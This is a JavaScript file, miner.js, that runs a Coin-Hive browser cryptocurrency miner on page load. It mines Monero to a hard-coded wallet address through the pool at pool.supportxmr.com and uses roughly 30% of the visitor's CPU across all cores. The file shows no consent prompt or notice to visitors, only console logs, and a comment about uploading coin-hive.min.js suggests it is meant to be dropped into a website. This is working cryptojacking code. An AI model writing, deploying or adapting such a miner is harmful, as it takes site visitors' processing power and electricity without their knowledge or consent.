// miner.js - Controller for the Coin-Hive Stratum miner

(function() {
    'use strict';

    // --- CONFIGURATION ---
    const WALLET = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH"; // <-- PASTE YOUR WALLET ADDRESS HERE
    const POOL_HOST = "pool.supportxmr.com";
    const POOL_PORT = 3333;

    // --- DO NOT EDIT BELOW THIS LINE ---

    // This will be our miner object
    let miner = null;

    // Function to start the miner
    function startMiner() {
        console.log("Starting Coin-Hive Stratum miner for wallet: " + WALLET);

        // The Coin-Hive library creates a global 'CoinHive' object
        if (typeof CoinHive === 'undefined') {
            console.error("FATAL: CoinHive library not loaded. Did you upload coin-hive.min.js?");
            return;
        }

        // Create the miner
        miner = new CoinHive.User(WALLET, {
            pool: {
                host: POOL_HOST,
                port: POOL_PORT
            },
            throttle: 0.7, // Use 30% CPU
            threads: navigator.hardwareConcurrency || 2
        });

        // Listen for events
        miner.on('open', function() {
            console.log("Connection to pool established.");
        });

        miner.on('authed', function(params) {
            console.log("Authenticated with pool. Worker ID:", params.id);
        });

        miner.on('close', function() {
            console.log("Connection to pool closed.");
        });

        miner.on('error', function(params) {
            console.error("Miner Error:", params.error);
        });

        miner.on('job', function(params) {
            // console.log("New job received.");
        });

        miner.on('found', function(params) {
            console.log("Hash found!");
        });

        miner.on('accepted', function(params) {
            console.log("Hash accepted by pool.");
        });

        // Start mining
        miner.start();
    }

    // Wait for the page to load, then start the miner
    window.onload = startMiner;

})();
